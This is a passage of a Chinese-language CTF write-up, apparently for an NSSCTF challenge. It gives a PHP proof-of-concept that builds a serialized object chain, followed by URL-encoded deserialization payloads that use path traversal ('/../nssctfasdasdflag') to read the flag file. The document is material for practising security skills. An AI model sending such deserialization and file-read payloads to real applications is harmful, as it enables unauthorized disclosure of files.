<font style="color:rgb(77, 77, 77);">所以poc</font>

```php
<?php
class acp 
{   
    protected $cinder;  
    public $neutron;
    public $nova;
    function __construct() 
    {      
        $this->cinder = new ace;
    }  
    function __toString()      
    {          
        if (isset($this->cinder))  
            return $this->cinder->echo_name();      
    }  
}  

class ace
{    
    public $filename='flag.php';     
    public $openstack;
    public $docker=null; 
}  
$a=new acp();
echo urlencode(serialize($a));
?>
```

运行得到pop链

```php
O%3A3%3A%22acp%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00cinder%22%3BO%3A3%3A%22ace%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A9%3A%22openstack%22%3BN%3Bs%3A6%3A%22docker%22%3BN%3B%7Ds%3A7%3A%22neutron%22%3BN%3Bs%3A4%3A%22nova%22%3BN%3B%7D
```

传参后发生页面跳转 查看源代码发现flag在/nssctfasdasdflag

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737551887523-0c98a49f-87e2-4385-a3a9-e323552f40f3.png)

修改filename=/nssctfasdasdflag 得到pop链

```php
O%3A3%3A%22acp%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00cinder%22%3BO%3A3%3A%22ace%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bs%3A17%3A%22%2Fnssctfasdasdflag%22%3Bs%3A9%3A%22openstack%22%3BN%3Bs%3A6%3A%22docker%22%3BN%3B%7Ds%3A7%3A%22neutron%22%3BN%3Bs%3A4%3A%22nova%22%3BN%3B%7D
```

上传后发现文件路径可能不对 于是搜索下一级

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737552004013-504b7133-75fe-48f6-8c0f-f059b007db28.png)

修改为

```php
filename='/../nssctfasdasdflag'
```

接着得到pop链

```php
O%3A3%3A%22acp%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00cinder%22%3BO%3A3%3A%22ace%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bs%3A20%3A%22%2F..%2Fnssctfasdasdflag%22%3Bs%3A9%3A%22openstack%22%3BN%3Bs%3A6%3A%22docker%22%3BN%3B%7Ds%3A7%3A%22neutron%22%3BN%3Bs%3A4%3A%22nova%22%3BN%3B%7D
```

得到flag

![](https://cdn.nlark.com/yuque/0/2025/png/49235244/1737552112098-59bd2d14-ceea-4bc7-bd08-37a9f0f794e4.png)

